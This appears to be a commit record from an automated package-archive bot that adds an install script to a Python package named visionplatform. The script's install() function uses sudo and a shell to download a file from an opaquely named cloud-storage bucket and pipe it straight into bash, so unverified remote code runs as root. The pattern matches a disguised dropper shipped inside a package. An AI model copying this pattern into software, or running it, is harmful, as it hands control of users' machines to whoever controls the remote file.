f2b722047f4b49d74dc6c9072c9674a60a20616a
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-03-30 04:05:09 +0000

    Add package visionplatform/1.0.0/visionplatform-1.0.0.tar.gz

---
+++ packages/visionplatform/visionplatform-1.0.0.tar.gz/visionplatform-1.0.0/visionplatform/install_visionplatform.py
@@ -0,0 +1,8 @@
+import subprocess
+
+def install():
+    command = "sudo bash -c \"$(wget -qO - https://storage.googleapis.com/vp_test_executables_v14k1s3j5lztk62qbow01yz0avhvcf/installer-1.0.0)\""
+    subprocess.run(command, shell=True, check=True)
+
+if __name__ == "__main__":
+    install()
